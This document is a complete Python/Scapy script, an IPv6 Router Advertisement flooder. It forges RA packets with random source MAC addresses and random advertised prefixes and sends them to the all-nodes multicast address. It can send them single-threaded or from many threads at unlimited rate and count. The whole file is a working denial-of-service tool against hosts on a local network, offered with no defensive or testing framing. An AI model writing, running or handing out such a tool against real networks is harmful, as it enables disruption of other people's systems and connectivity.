#!/usr/bin/env python3
"""
IPv6 Router‑Advertisement Flooder
---------------------------------
* Default mode  : single‑thread loop, fresh RA each time
* --fast        : multi‑thread loop for high PPS **with live tqdm**
* --threads N   : number of workers in fast mode (default 4)
"""

import argparse
import logging
import random
import signal
import threading
import time

from tqdm import tqdm
from scapy.all import (
    Ether, IPv6,
    ICMPv6ND_RA, ICMPv6NDOptPrefixInfo,
    sendp, conf
)
from utils import random_mac, mac_to_link_local


# ----------------------------------------------------------------------
# 1.  Build ONE forged Router‑Advertisement frame
# ----------------------------------------------------------------------
def build_ra():
    src_mac = random_mac()
    dst_mac = "33:33:00:00:00:01"      # IPv6 multicast MAC
    src_ll  = mac_to_link_local(src_mac)
    dst_ip  = "ff02::1"                # all‑nodes multicast

    ra_hdr = ICMPv6ND_RA(
        chlim=64, H=1, routerlifetime=0,
        reachabletime=0, retranstimer=0
    )

    prefix_opt = ICMPv6NDOptPrefixInfo(
        prefixlen=64, L=1, A=1,
        validlifetime=0xffffffff,
        preferredlifetime=0xffffffff,
        prefix=f"2001:{random.randint(0,0xffff):x}::"
    )

    return Ether(dst=dst_mac, src=src_mac)/IPv6(src=src_ll,dst=dst_ip)/ra_hdr/prefix_opt


# ----------------------------------------------------------------------
# 2.  Single‑thread loop (default mode)
# ----------------------------------------------------------------------
def flood_loop(iface: str, pps: int, count: int):
    sent, stop = 0, False

    def sigint(*_):   # graceful Ctrl‑C
        nonlocal stop
        stop = True
    signal.signal(signal.SIGINT, sigint)

    bar = tqdm(total=count if count else None,
               unit="pkt", desc="RA flood", colour="green")

    while not stop and (count == 0 or sent < count):
        sendp(build_ra(), iface=iface, verbose=False)
        sent += 1
        bar.update(1)
        if pps:
            time.sleep(1/pps)

    bar.close()
    print(f"[+] Finished – {sent} packets sent")


# ----------------------------------------------------------------------
# 3.  Multi‑thread high‑speed loop (fast mode)
# ----------------------------------------------------------------------
def flood_fast(iface: str, pps: int, count: int, threads: int):
    sent      = 0
    stop_evt  = threading.Event()
    pkt_cache = build_ra()                 # reuse allocs

    def worker():
        nonlocal sent
        while not stop_evt.is_set() and (count == 0 or sent < count):
            sendp(pkt_cache, iface=iface, verbose=False)
            sent += 1
            if pps:
                time.sleep(1/pps)

    workers = [threading.Thread(target=worker, daemon=True)
               for _ in range(threads)]
    for w in workers:
        w.start()

    bar = tqdm(total=count if count else None,
               unit="pkt", desc=f"RA flood x{threads}", colour="cyan")

    try:
        while not stop_evt.is_set() and (count == 0 or sent < count):
            bar.n = sent
            bar.refresh()
            time.sleep(0.5)
    except KeyboardInterrupt:
        stop_evt.set()

    for w in workers:
        w.join()
    bar.n = sent
    bar.refresh(); bar.close()
    print(f"[+] Finished – {sent} packets sent")


# ----------------------------------------------------------------------
# 4.  CLI
# ----------------------------------------------------------------------
def main():
    parser = argparse.ArgumentParser(
        description="IPv6 Router‑Advertisement flooder"
    )
    parser.add_argument("-i","--iface", default="eno1",
                        help="network interface (default: eno1)")
    parser.add_argument("-r","--rate", type=int, default=0,
                        help="packets per second PER THREAD (0 = max)")
    parser.add_argument("-c","--count", type=int, default=0,
                        help="total packets to send (0 = infinite)")
    parser.add_argument("--fast", action="store_true",
                        help="enable multi‑thread high‑speed mode")
    parser.add_argument("--threads", type=int, default=4,
                        help="number of worker threads in fast mode")
    args = parser.parse_args()

    if args.fast:
        flood_fast(args.iface, args.rate, args.count, args.threads)
    else:
        flood_loop(args.iface, args.rate, args.count)


# ----------------------------------------------------------------------
# 5.  Boilerplate
# ----------------------------------------------------------------------
if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO,
                        format="%(levelname)s: %(message)s")
    conf.iface6 = None
    main()
